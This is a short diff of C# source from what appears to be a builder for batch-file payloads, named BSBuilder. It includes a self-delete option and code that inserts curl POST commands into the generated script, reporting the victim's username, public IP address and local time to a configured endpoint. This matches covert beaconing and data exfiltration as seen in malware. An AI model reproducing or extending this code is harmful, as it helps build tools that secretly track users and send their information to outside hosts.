@@ -152,8 +152,8 @@ namespace BSBuilder
             handleBooleanSetting(settings.selfdelete, "skipselfdelete");
 
             if (settings.reportstartmsg.Length != 0)
-                batch = utils.editCurl(batch, utils.constructCurlPost("```[Report from %USERNAME% - %NetworkIP%]\\nLocal time: %HH24%:%MI%```"), settings.reportstartmsg);
-
+                batch = utils.editCurl(batch, utils.constructCurlPost("```[Report from %USERNAME% - %PublicIP%]\\nLocal time: %HH24%:%MI%```"), settings.reportstartmsg);
+                
             if (settings.reportendmsg.Length != 0)
                 batch = utils.editCurl(batch, utils.constructCurlPost("```Batch Scheduled: %recurring%\\n[End of report]```"), settings.reportendmsg);
 
